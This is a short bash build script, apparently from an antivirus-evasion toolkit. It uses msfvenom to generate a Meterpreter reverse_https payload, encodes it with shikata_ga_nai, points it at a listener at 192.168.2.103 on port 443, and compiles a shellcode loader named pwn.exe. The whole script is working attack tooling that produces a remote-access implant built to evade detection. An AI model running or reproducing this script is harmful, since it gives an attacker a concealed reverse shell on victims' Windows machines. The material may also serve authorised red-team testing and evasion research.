#!/bin/bash          
# build the .exe file that loads the shellcode from a file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > sc.bin
# call make_avet, the -l compiles the filename into the .exe file 
./make_bfg -l
# compile to pwn.exe file
$win32_compiler -o pwn.exe bfg.c
#strip pwn.exe
# cleanup
echo "" > defs.h
# call your programm with pwn.exe sc.bin
